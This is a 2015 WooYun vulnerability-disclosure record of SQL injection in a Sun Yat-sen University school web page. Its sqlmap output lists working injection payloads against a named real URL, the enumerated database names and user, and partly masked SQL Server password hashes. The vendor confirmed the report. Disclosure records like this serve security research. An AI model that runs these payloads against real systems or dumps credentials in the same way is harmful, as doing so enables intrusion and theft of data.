{"id": 70865, "wybug_id": "wooyun-2015-0133960", "wybug_title": "中山大学某学院sql注入漏洞", "wybug_corp": "中山大学", "wybug_author": "日出东方", "wybug_date": "2015-08-14 10:14", "wybug_open_date": "2015-09-28 17:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-28：\t细节向公众公开  简要描述： 像我等菜鸟，挖不到大厂商的漏洞，只能挖挖学校了。。rt求过 详细说明：  中山大学信息科学与技术学院 sql注入漏洞http://sist.sysu.edu.cn/main/news/MasterTopTwoNews.aspx?no=104&pId=104no参数的问题 sqlmap resumed the following injection point(s) from stored session:---Parameter: no (GET)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: no=104 AND 7486=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7486=7486) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(120)+CHAR(107)+CHAR(113)))&pId=104    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: no=(SELECT CHAR(113)+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (3088=3088) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(120)+CHAR(107)+CHAR(113))&pId=104    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: no=104;WAITFOR DELAY '0:0:5'--&pId=104    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: no=104 WAITFOR DELAY '0:0:5'&pId=104    Type: UNION query    Title: Generic UNION query (NULL) - 12 columns    Payload: no=104 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113)+CHAR(116)+CHAR(98)+CHAR(106)+CHAR(117)+CHAR(70)+CHAR(86)+CHAR(86)+CHAR(71)+CHAR(65)+CHAR(68)+CHAR(113)+CHAR(107)+CHAR(120)+CHAR(107)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL-- &pId=104---[20:00:00] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005问题还很严重呢。。available databases [6]:[*] cs[*] EMS[*] master[*] model[*] msdb[*] tempdbcurrent user:    'vins'database management system users password hashes:[*] sa [1]:    password hash: 0x01004086ceb6a1d791f3---5279884a81c24a8d15b8ad90cd2e5[*] vins [1]:    password hash: 0x01005f33543c767ab43f8---562a35493201db11b3095c2a85622手动打码---- 到此为止over++   漏洞证明：  rt   修复方案：  123   版权声明：转载请注明来源 日出东方@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-08-14 17:47 厂商回复： 谢谢，我们已在着手处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}